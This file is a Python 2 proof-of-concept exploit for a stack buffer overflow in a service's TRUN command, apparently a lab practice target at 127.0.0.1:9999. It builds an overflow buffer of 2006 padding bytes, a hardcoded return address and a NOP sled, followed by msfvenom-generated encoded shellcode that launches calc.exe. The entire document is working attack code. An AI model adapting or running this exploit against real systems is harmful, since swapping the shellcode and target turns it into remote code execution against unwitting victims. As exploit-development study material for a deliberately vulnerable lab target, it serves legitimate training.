#!/usr/bin/env python
import socket
import sys

# Final PoC which will pop calc.exe if successful.

buffer = "TRUN ."

# msfvenom --platform windows -a x86 -p windows/exec CMD="cmd.exe /C calc.exe"
#          EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python

shellcode = "\xdd\xc6\xba\xe2\x88\x59\x05\xd9\x74\x24\xf4\x5b\x2b"
shellcode += "\xc9\xb1\x31\x83\xeb\xfc\x31\x53\x14\x03\x53\xf6\x6a"
shellcode += "\xac\xf9\x1e\xe8\x4f\x02\xde\x8d\xc6\xe7\xef\x8d\xbd"
shellcode += "\x6c\x5f\x3e\xb5\x21\x53\xb5\x9b\xd1\xe0\xbb\x33\xd5"
shellcode += "\x41\x71\x62\xd8\x52\x2a\x56\x7b\xd0\x31\x8b\x5b\xe9"
shellcode += "\xf9\xde\x9a\x2e\xe7\x13\xce\xe7\x63\x81\xff\x8c\x3e"
shellcode += "\x1a\x8b\xde\xaf\x1a\x68\x96\xce\x0b\x3f\xad\x88\x8b"
shellcode += "\xc1\x62\xa1\x85\xd9\x67\x8c\x5c\x51\x53\x7a\x5f\xb3"
shellcode += "\xaa\x83\xcc\xfa\x03\x76\x0c\x3a\xa3\x69\x7b\x32\xd0"
shellcode += "\x14\x7c\x81\xab\xc2\x09\x12\x0b\x80\xaa\xfe\xaa\x45"
shellcode += "\x2c\x74\xa0\x22\x3a\xd2\xa4\xb5\xef\x68\xd0\x3e\x0e"
shellcode += "\xbf\x51\x04\x35\x1b\x3a\xde\x54\x3a\xe6\xb1\x69\x5c"
shellcode += "\x49\x6d\xcc\x16\x67\x7a\x7d\x75\xed\x7d\xf3\x03\x43"
shellcode += "\x7d\x0b\x0c\xf3\x16\x3a\x87\x9c\x61\xc3\x42\xd9\x8e"
shellcode += "\x21\x47\x17\x27\xfc\x02\x9a\x2a\xff\xf8\xd8\x52\x7c"
shellcode += "\x09\xa0\xa0\x9c\x78\xa5\xed\x1a\x90\xd7\x7e\xcf\x96"
shellcode += "\x44\x7e\xda\xf4\x0b\xec\x86\xd4\xae\x94\x2d\x29"

ret = "\xaf\x11\x50\x62"

buffer += "A" * 2006 + ret + "\x90" * 8 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',9999))
print s.recv(1024)
s.send(buffer)
data = s.recv(1024)
print data
s.close()
